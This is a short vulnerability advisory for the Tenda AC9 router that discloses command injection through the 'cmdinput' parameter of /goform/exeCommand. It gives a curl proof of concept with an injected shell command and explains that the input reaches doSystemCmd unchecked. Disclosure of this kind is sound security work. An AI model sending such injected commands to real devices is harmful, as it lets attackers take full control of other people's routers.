**Vendor of the products:** Tenda

**Affected Device:** Tenda AC9

**Version:** V1.0BR_V15.03.05.14

**Firmware Download:** https://www.tenda.com.cn/material/show/2650



**Vulnerability Description:** A command injection vulnerability was discovered in Tenda AC9 V1.0BR_V15.03.05.14, triggered by the cmdinput parameter in /goform/exeCommand. Attackers can exploit this vulnerability by crafting malicious packets to execute arbitrary commands, thereby gaining full control of the target device.



# POC:

```bash
curl http://192.168.0.1/goform/exeCommand?cmdinput=;touch /tmp/hackac9.txt
```

![image-20250904200303243](Tenda_AC9_CJ .assets/image-20250904200303243.png)

# Vulnerability Effect:

It can be seen that the file has been successfully created and the command has been executed successfully. 

![image-20250904200459535](Tenda_AC9_CJ .assets/image-20250904200459535.png)

# Vulnerability Cause:

In the formexeCommand function, the program first obtains the value of  the "cmdinput" parameter, then directly concatenates it into the  doSystemCmd function for execution without any security checks. This  allows attackers to execute arbitrary commands and thus gain full  control of the device.

![image-20250904200601749](Tenda_AC9_CJ .assets/image-20250904200601749.png)

 